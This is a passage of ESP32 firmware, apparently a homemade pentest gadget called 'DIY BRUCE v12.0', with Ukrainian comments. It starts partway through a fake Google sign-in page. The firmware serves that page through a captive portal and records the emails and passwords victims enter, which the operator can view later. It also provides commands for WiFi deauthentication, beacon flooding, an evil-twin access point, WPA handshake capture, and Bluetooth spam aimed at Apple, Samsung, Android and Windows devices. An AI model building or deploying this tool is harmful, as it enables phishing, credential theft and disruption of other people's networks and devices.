button{background:#4285F4;color:white;border:none;padding:12px;border-radius:24px;width:100%;cursor:pointer;}
</style></head><body><div class="logo">Google</div><div class="form-box"><form action="/pass" method="POST">
<input type="email" name="email" placeholder="Email" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Sign in</button>
</form></div></body></html>
)rawliteral";

// ============================================================================
// ВЕБ ОБРОБНИКИ
// ============================================================================
void handleRoot() { server.send(200, "text/html", index_html); }
void handlePortal() { server.send(200, "text/html", portal_html); }

void handleData() {
    String json = "{\"deauth\":" + String(deauthPackets) + ",\"beacon\":" + String(beaconPackets) + ",\"rssi\":" + String(lastRSSI) + ",\"clients\":" + String(connectedClients) + ",\"uptime\":" + String((millis() - uptimeStart)/1000) + "}";
    server.send(200, "application/json", json);
}

void handleNetworksList() {
    String output = "";
    for (int i = 0; i < wifiCount; i++) {
        output += String(i+1) + ". " + wifiNames[i] + " | CH:" + String(wifiChannel[i]) + " | RSSI:" + String(wifiRSSI[i]) + "dBm\n";
    }
    if (output.length() == 0) output = "No networks. Click SCAN.";
    server.send(200, "text/plain", output);
}

void handleCmd() {
    if (!server.hasArg("c")) { server.send(200, "text/plain", "NO CMD"); return; }
    String cmd = server.arg("c");
    String resp = "OK";

    if (cmd == "scan") { scanWiFi(); handleNetworksList(); return; }
    else if (cmd == "list_networks") { handleNetworksList(); return; }
    else if (cmd == "deauth_start") { startDeauth(); }
    else if (cmd == "deauth_stop") { stopDeauth(); }
    else if (cmd == "beacon_start") { startBeacon(); }
    else if (cmd == "beacon_stop") { stopBeacon(); }
    else if (cmd == "evil_start") { startEvil(); }
    else if (cmd == "evil_stop") { stopEvil(); }
    else if (cmd == "handshake") { startHandshake(); }
    else if (cmd == "ble_scan") { scanBLE(); resp = "Found " + String(bleCount) + " devices"; }
    else if (cmd == "ble_apple") { bleApple(); }
    else if (cmd == "ble_samsung") { bleSamsung(); }
    else if (cmd == "ble_android") { bleAndroid(); }
    else if (cmd == "ble_windows") { bleWindows(); }
    else if (cmd == "ble_iphone") { bleiPhone(); }
    else if (cmd == "ble_all") { bleSpamAll(); }
    else if (cmd == "ir_power") { irPower(); resp = "POWER"; }
    else if (cmd == "ir_vol_up") { irVolUp(); resp = "VOL+"; }
    else if (cmd == "ir_vol_down") { irVolDown(); resp = "VOL-"; }
    else if (cmd == "ir_mute") { irMute(); resp = "MUTE"; }
    else if (cmd == "ir_bavis") { irBravis(); resp = "BRAVIS TV"; }
    else if (cmd == "ir_samsung") { irSamsung(); resp = "SAMSUNG TV"; }
    else if (cmd == "ir_lg") { irLG(); resp = "LG TV"; }
    else if (cmd == "ir_sony") { irSony(); resp = "SONY TV"; }
    else if (cmd == "ir_philips") { irPhilips(); resp = "PHILIPS TV"; }
    else if (cmd == "view_pass") { server.send(200, "text/plain", savedPasswords.length() ? savedPasswords : "(empty)"); return; }
    else if (cmd == "view_hand") { server.send(200, "text/plain", savedHandshakes.length() ? savedHandshakes : "(empty)"); return; }
    else if (cmd == "clear_pass") { savedPasswords = ""; saveData(); resp = "Passwords cleared"; }
    else if (cmd == "clear_hand") { savedHandshakes = ""; saveData(); resp = "Handshakes cleared"; }
    else if (cmd == "clear_all") { clearData(); }
    else if (cmd == "web_off") { webRunning = false; server.stop(); resp = "Web stopped"; }
    else if (cmd == "sysinfo") { resp = "DIY BRUCE v12.0\nESP32\nHeap: " + String(ESP.getFreeHeap()/1024) + " KB\nUptime: " + String((millis() - uptimeStart)/1000) + "s\nAP: " + apSSID; server.send(200, "text/plain", resp); return; }
    else if (cmd == "reboot") { server.send(200, "text/plain", "REBOOT"); delay(100); ESP.restart(); return; }
    
    server.send(200, "text/plain", resp);
}

void handlePass() {
    if (server.hasArg("email") || server.hasArg("password")) {
        addPassword("Email: " + server.arg("email") + " | Pass: " + server.arg("password"));
        server.send(200, "text/html", "<html><body><h3>OK</h3><script>setTimeout(function(){window.location.href='/';},2000);</script></body></html>");
    } else {
        server.send(200, "text/html", "<html><body><h3>Error</h3></body></html>");
    }
}

void startWeb() {
    if (webRunning) return;
    WiFi.softAP(apSSID.c_str(), apPassword.c_str());
    dnsServer.start(53, "*", WiFi.softAPIP());
    server.on("/", handleRoot);
    server.on("/portal.html", handlePortal);
    server.on("/cmd", handleCmd);
    server.on("/data", handleData);
    server.on("/pass", HTTP_POST, handlePass);
    server.begin();
    webRunning = true;
    showMessage("WEB: 192.168.4.1", 2000);
}

void showSystemInfo() {
    u8g2.clearBuffer(); drawTopBar();
    u8g2.setFont(u8g2_font_6x10_tr);
    u8g2.drawStr(5, 20, "DIY BRUCE v12.0");
    u8g2.drawStr(5, 35, "ESP32 Dev Module");
    char buf[32]; sprintf(buf, "Heap: %d KB", ESP.getFreeHeap()/1024);
    u8g2.drawStr(5, 50, buf);
    u8g2.drawStr(5, 60, "BACK - Exit");
    u8g2.sendBuffer();
    while (!checkButton(PIN_BTN_BACK)) delay(50);
}

// ============================================================================
// МЕНЮ
// ============================================================================
const char* wifiSub[] = {"SCAN","DEAUTH","BEACON","EVIL","HANDSHAKE","WEB","CLEAR","INFO","REBOOT"};
const int wifiSize = 9;
const char* bleSub[] = {"SCAN","APPLE","SAMSUNG","ANDROID","WINDOWS","IPHONE","ALL"};
const int bleSize = 7;
const char* irSub[] = {"POWER","VOL+","VOL-","BRAVIS","SAMSUNG","LG"};
const int irSize = 6;
const char* settSub[] = {"WEB ON","CLEAR","INFO","REBOOT"};
const int settSize = 4;

void executeWiFi() {
    switch(currentSubItem) {
        case 0: scanWiFi(); break;
        case 1: startDeauth(); break;
        case 2: startBeacon(); break;
        case 3: startEvil(); break;
        case 4: startHandshake(); break;
        case 5: startWeb(); break;
        case 6: clearData(); break;
        case 7: showSystemInfo(); break;
        case 8: ESP.restart(); break;
    }
}

void executeBLE() {
    switch(currentSubItem) {
        case 0: scanBLE(); break;
        case 1: bleApple(); break;
        case 2: bleSamsung(); break;
        case 3: bleAndroid(); break;
        case 4: bleWindows(); break;
        case 5: bleiPhone(); break;
        case 6: bleSpamAll(); break;
    }
}

void executeIR() {
    switch(currentSubItem) {
        case 0: irPower(); break;
        case 1: irVolUp(); break;
        case 2: irVolDown(); break;
        case 3: irBravis(); break;
        case 4: irSamsung(); break;
        case 5: irLG(); break;
    }
}

void executeSettings() {
    switch(currentSubItem) {
        case 0: startWeb(); break;
        case 1: clearData(); break;
        case 2: showSystemInfo(); break;
        case 3: ESP.restart(); break;
    }
}

// ============================================================================
// SETUP
// ============================================================================
void setup() {
    Serial.begin(115200);
    pinMode(PIN_BTN_UP, INPUT_PULLUP);
    pinMode(PIN_BTN_DOWN, INPUT_PULLUP);
    pinMode(PIN_BTN_OK, INPUT_PULLUP);
    pinMode(PIN_BTN_LEFT, INPUT_PULLUP);
    pinMode(PIN_BTN_RIGHT, INPUT_PULLUP);
    pinMode(PIN_BTN_BACK, INPUT_PULLUP);
    
    Wire.begin(PIN_OLED_SDA, PIN_OLED_SCL);
    u8g2.begin();
    u8g2.setContrast(200);
    
    loadData();
    uptimeStart = millis();
    bootAnimation();
    
    WiFi.mode(WIFI_AP_STA);
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(handshakeCallback);
    
    drawMainMenu();
    showMessage("DIY BRUCE v12.0 READY", 1500);
    startWeb();
}

// ============================================================================
// LOOP
// ============================================================================
void loop() {
    if (webRunning) {
        dnsServer.processNextRequest();
        server.handleClient();
    }
    
    connectedClients = WiFi.softAPgetStationNum();
    lastRSSI = WiFi.RSSI();
    
    if (!inSubMenu) {
        if (checkButton(PIN_BTN_LEFT)) { currentModule = (currentModule - 1 + 6) % 6; drawMainMenu(); }
        if (checkButton(PIN_BTN_RIGHT)) { currentModule = (currentModule + 1) % 6; drawMainMenu(); }
        if (checkButton(PIN_BTN_OK) || checkButton(PIN_BTN_DOWN)) {
            inSubMenu = true; currentSubItem = 0;
            switch(currentModule) {
                case 0: drawSubMenu("WiFi", wifiSub, wifiSize, 0); break;
                case 1: drawSubMenu("BLE", bleSub, bleSize, 0); break;
                case 2: drawSubMenu("IR", irSub, irSize, 0); break;
                case 5: drawSubMenu("Settings", settSub, settSize, 0); break;
                default: drawSubMenu("Module", wifiSub, wifiSize, 0); break;
            }
        }
    } else {
        int size = 0;
        switch(currentModule) {
            case 0: size = wifiSize; break;
            case 1: size = bleSize; break;
            case 2: size = irSize; break;
            case 5: size = settSize; break;
            default: size = wifiSize; break;
        }
        if (checkButton(PIN_BTN_UP)) { currentSubItem = (currentSubItem - 1 + size) % size; }
        if (checkButton(PIN_BTN_DOWN)) { currentSubItem = (currentSubItem + 1) % size; }
        if (checkButton(PIN_BTN_UP) || checkButton(PIN_BTN_DOWN)) {
            switch(currentModule) {
                case 0: drawSubMenu("WiFi", wifiSub, size, currentSubItem); break;
                case 1: drawSubMenu("BLE", bleSub, size, currentSubItem); break;
                case 2: drawSubMenu("IR", irSub, size, currentSubItem); break;
                case 5: drawSubMenu("Settings", settSub, size, currentSubItem); break;
                default: drawSubMenu("WiFi", wifiSub, size, currentSubItem); break;
            }
        }
        if (checkButton(PIN_BTN_OK)) {
            switch(currentModule) {
                case 0: executeWiFi(); break;
                case 1: executeBLE(); break;
                case 2: executeIR(); break;
                case 5: executeSettings(); break;
            }
            inSubMenu = false; drawMainMenu();
        }
        if (checkButton(PIN_BTN_BACK)) { inSubMenu = false; drawMainMenu(); }
    }
    delay(20);
}
